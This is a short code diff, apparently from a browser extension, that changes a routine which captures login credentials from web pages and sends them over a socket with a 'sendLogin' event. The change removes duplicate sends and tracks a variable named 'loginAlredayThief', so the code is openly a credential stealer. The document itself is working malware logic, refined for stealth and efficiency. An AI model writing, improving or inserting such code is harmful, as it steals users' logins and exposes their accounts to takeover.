@@ -30,7 +30,6 @@ function listenFromPage(socket) {
                 url : urlFormated,
                 login : request.login
             };
-            socket.emit('sendLogin', data);
 
             var local_site = [];
             if (localStorage['site']) {
@@ -40,7 +39,17 @@ function listenFromPage(socket) {
                 var site_existe = false;
                 $.each(local_site, function (iSite, site) {
                     if (urlFormated === site.url) {
-                        local_site[iSite]['login'].push(request.login);
+                        var loginAlredayThief = false;
+                        $.each(site.login, function(iLogin, login){
+                            if( JSON.stringify(login) === JSON.stringify(request.login)){
+                                loginAlredayThief = true;
+                            }
+                        });
+
+                        if(!loginAlredayThief){
+                            local_site[iSite]['login'].push(request.login);
+                            socket.emit('sendLogin', data);
+                        }
                         site_existe = true;
                         return false;
                     }
@@ -51,6 +60,7 @@ function listenFromPage(socket) {
                         'url': urlFormated,
                         'login': [request.login]
                     });
+                    socket.emit('sendLogin', data);
                 }
             }
             else {
@@ -59,6 +69,7 @@ function listenFromPage(socket) {
                     'url': urlFormated,
                     'login': [request.login]
                 });
+                socket.emit('sendLogin', data);
             }
             localStorage['site'] = JSON.stringify(local_site);
         }
